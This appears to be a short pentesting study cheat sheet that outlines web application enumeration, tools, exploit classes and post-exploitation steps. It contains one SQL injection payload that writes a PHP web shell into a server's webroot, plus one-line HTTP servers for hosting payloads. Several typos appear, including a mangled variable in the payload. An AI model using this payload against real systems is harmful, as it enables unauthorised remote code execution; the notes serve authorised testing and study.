# Web App Methology
## Web App Enumeration
### 1. Enum Technology
  - Programming language and frameworks
  - Web Server software
  - Database software
  - Server operating system
### 2. Inspec URLs
### 3. Inspect Page Content
  - *Ctrl + Shift + K*
  - *Ctrl + U*
### 4. View Response Headers
  - *Ctrl + Shift + K* > Network
  - BurpSuite
### 5. Inspect Sitemaps
  - *robots.txt*
### 6. Locate Administration Consoles
Two common exaples are **/manager/html** from Tomcat and **/phpmyadmin** from phpMyAdmin
### 7. Throw Web App Assessment Tools
  - Dirb / Dirbuster
  - Burp Suite
  - Nikto
### 8. Exploit
  - XSS
  - Direcroty Travesal Vulnerabilities
  - Local File Inclusion (Execute uploaded scripts)
  - Remote File Inclusion (Execute remote scripts)
  - LFI Code Execution
  - Log Poisoning
  - PHP Wrappers
  - SQL Injection
  - SQLI to RCE
    ```bash
    http://10.10.10.10./debug.php?id=1 union select 1, 2, "<?php echo shell_exec(?_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/shell.php'
    ```
### 9. Post-Exploitation
  - **/usr/share/webshells**
### *Notes*
- Older versions of PHP have a vulnerability in which a null byte \(\%00\) will terminate any string. This trick can be used to bypass file extensions.
- PHP HTTP Server
  ```bash
  php -S 0.0.0.0:8080
  ```
- Ruby HTTP Server
  ```bash
  ruby -run -e httpd . -p 9000
  ```
- BusyBox HTTP Server
  ```bash
  busybox httpd -f -p 10000
  ```
